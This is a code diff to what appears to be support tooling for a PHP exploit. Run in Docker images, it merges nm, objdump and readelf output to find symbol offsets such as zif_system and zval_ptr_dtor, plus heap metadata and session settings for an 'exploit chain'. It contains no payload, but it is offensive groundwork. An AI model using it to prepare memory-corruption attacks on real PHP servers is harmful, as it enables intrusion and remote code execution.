@@ -58,6 +58,8 @@ LIBPHP_SEARCH = [
     "/usr/lib/apache2/modules/libphp7.so",
     "/usr/local/lib/libphp.so",
     "/usr/local/lib/libphp8.so",
+    "/usr/local/sbin/php-fpm",
+    "/usr/local/bin/php",
 ]
 
 
@@ -102,11 +104,47 @@ def _extract_symbols_nm(image: str, libphp_path: str, platform: Optional[str] = 
     return _parse_symbol_output(out)
 
 
+def _extract_symbols_nm_full(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
+    """Extract symbols via nm (full symbol table — includes local/static symbols like zif_system)."""
+    prefix = _install_binutils(image, platform)
+    nm_cmd = f"{prefix}nm {libphp_path} 2>/dev/null"
+    out, _, _ = _docker_run(image, nm_cmd, platform)
+    return _parse_symbol_output(out)
+
+
 def _extract_symbols_objdump(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
-    """Fallback: extract symbols via objdump -T (for stripped binaries with .dynsym)."""
+    """Extract dynamic symbols via objdump -T."""
     prefix = _install_binutils(image, platform)
     cmd = f"{prefix}objdump -T {libphp_path} 2>/dev/null"
     out, _, _ = _docker_run(image, cmd, platform)
+    return _parse_objdump_output(out)
+
+
+def _extract_symbols_objdump_full(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
+    """Extract all symbols via objdump -t (full table — includes static symbols)."""
+    prefix = _install_binutils(image, platform)
+    cmd = f"{prefix}objdump -t {libphp_path} 2>/dev/null"
+    out, _, _ = _docker_run(image, cmd, platform)
+    return _parse_objdump_output(out)
+
+
+def _extract_symbols_readelf(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
+    """Extract dynamic symbols via readelf --dyn-syms."""
+    prefix = _install_binutils(image, platform)
+    cmd = f"{prefix}readelf --dyn-syms {libphp_path} 2>/dev/null"
+    out, _, _ = _docker_run(image, cmd, platform)
+    return _parse_readelf_output(out)
+
+
+def _extract_symbols_readelf_full(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
+    """Extract all symbols via readelf --syms (full table)."""
+    prefix = _install_binutils(image, platform)
+    cmd = f"{prefix}readelf --syms {libphp_path} 2>/dev/null"
+    out, _, _ = _docker_run(image, cmd, platform)
+    return _parse_readelf_output(out)
+
+
+def _parse_objdump_output(out: str) -> Dict[str, int]:
     symbols: Dict[str, int] = {}
     all_needed = set(SYMBOLS_NEEDED + HEAP_SYMBOLS)
     for line in out.splitlines():
@@ -121,11 +159,7 @@ def _extract_symbols_objdump(image: str, libphp_path: str, platform: Optional[st
     return symbols
 
 
-def _extract_symbols_readelf(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
-    """Last resort: readelf --dyn-syms."""
-    prefix = _install_binutils(image, platform)
-    cmd = f"{prefix}readelf --dyn-syms {libphp_path} 2>/dev/null"
-    out, _, _ = _docker_run(image, cmd, platform)
+def _parse_readelf_output(out: str) -> Dict[str, int]:
     symbols: Dict[str, int] = {}
     all_needed = set(SYMBOLS_NEEDED + HEAP_SYMBOLS)
     for line in out.splitlines():
@@ -156,51 +190,48 @@ def _parse_symbol_output(out: str) -> Dict[str, int]:
 
 
 def _extract_all_symbols(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
-    """Try nm → objdump → readelf until we get the needed symbols."""
-    for method_name, method in [
+    """Extract symbols by merging dynamic and full symbol tables.
+
+    zval_ptr_dtor is a dynamic (T) symbol, but zif_system is a local (t)
+    symbol — no single tool flag finds both. We try dynamic first (fast),
+    then merge from the full symbol table for anything still missing.
+    """
+    methods = [
         ("nm -D", _extract_symbols_nm),
+        ("nm (full)", _extract_symbols_nm_full),
         ("objdump -T", _extract_symbols_objdump),
-        ("readelf", _extract_symbols_readelf),
-    ]:
-        symbols = method(image, libphp_path, platform)
-        if all(s in symbols for s in SYMBOLS_NEEDED):
-            print(f"  [+] Symbols found via {method_name}")
-            return symbols
-        if symbols:
-            print(f"  [~] {method_name}: partial ({list(symbols.keys())})")
-    return symbols
+        ("objdump -t (full)", _extract_symbols_objdump_full),
+        ("readelf --dyn-syms", _extract_symbols_readelf),
+        ("readelf --syms (full)", _extract_symbols_readelf_full),
+    ]
+    merged: Dict[str, int] = {}
+    for method_name, method in methods:
+        found = method(image, libphp_path, platform)
+        new_keys = [k for k in found if k not in merged]
+        if new_keys:
+            merged.update(found)
+            print(f"  [+] {method_name}: added {new_keys}")
+        if all(s in merged for s in SYMBOLS_NEEDED):
+            return merged
+    if merged:
+        print(f"  [~] Merged symbols: {list(merged.keys())}")
+    return merged
 
 
 def _extract_heap_offsets(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, any]:
-    """Extract heap structure offsets and PHP metadata via a PHP script + objdump analysis."""
-    php_script = r"""<?php
-// Detect zend_mm_heap structure size by triggering a small allocation
-$info = [
-    'php_version' => PHP_VERSION,
-    'arch' => php_uname('m'),
-    'sapi' => php_sapi_name(),
-    'os' => PHP_OS,
-    'zts' => PHP_ZTS,
-    'debug' => PHP_DEBUG,
-    'int_size' => PHP_INT_SIZE,
-    'pointer_size' => PHP_INT_SIZE, // same on LP64
-];
-
-// memory_limit parsing
-$mem = ini_get('memory_limit');
-$bytes = intval($mem);
-if (stripos($mem, 'M') !== false) $bytes *= 1024*1024;
-elseif (stripos($mem, 'G') !== false) $bytes *= 1024*1024*1024;
-$info['memory_limit'] = $bytes;
-
-// Session config (needed for Chain D)
-$info['session_save_path'] = session_save_path();
-$info['session_sid_length'] = (int)ini_get('session.sid_length');
-$info['session_upload_progress'] = (bool)ini_get('session.upload_progress.enabled');
-$info['session_strict_mode'] = (bool)ini_get('session.use_strict_mode');
-
-echo json_encode($info);
-"""
+    """Extract heap structure offsets and PHP metadata by running a PHP script inside the container."""
+    php_script = (
+        'echo json_encode(["php_version"=>PHP_VERSION,"arch"=>php_uname("m"),'
+        '"sapi"=>php_sapi_name(),"os"=>PHP_OS,"zts"=>PHP_ZTS,"debug"=>PHP_DEBUG,'
+        '"int_size"=>PHP_INT_SIZE,"pointer_size"=>PHP_INT_SIZE,'
+        '"memory_limit"=>(function(){$m=ini_get("memory_limit");$b=intval($m);'
+        'if(stripos($m,"M")!==false)$b*=1048576;elseif(stripos($m,"G")!==false)'
+        '$b*=1073741824;return $b;})(),'
+        '"session_save_path"=>session_save_path(),'
+        '"session_sid_length"=>(int)ini_get("session.sid_length"),'
+        '"session_upload_progress"=>(bool)ini_get("session.upload_progress.enabled"),'
+        '"session_strict_mode"=>(bool)ini_get("session.use_strict_mode")]);'
+    )
     cmd = f"php -r {_shell_escape(php_script)}"
     out, err, rc = _docker_run(image, cmd, platform)
     out = out.strip()
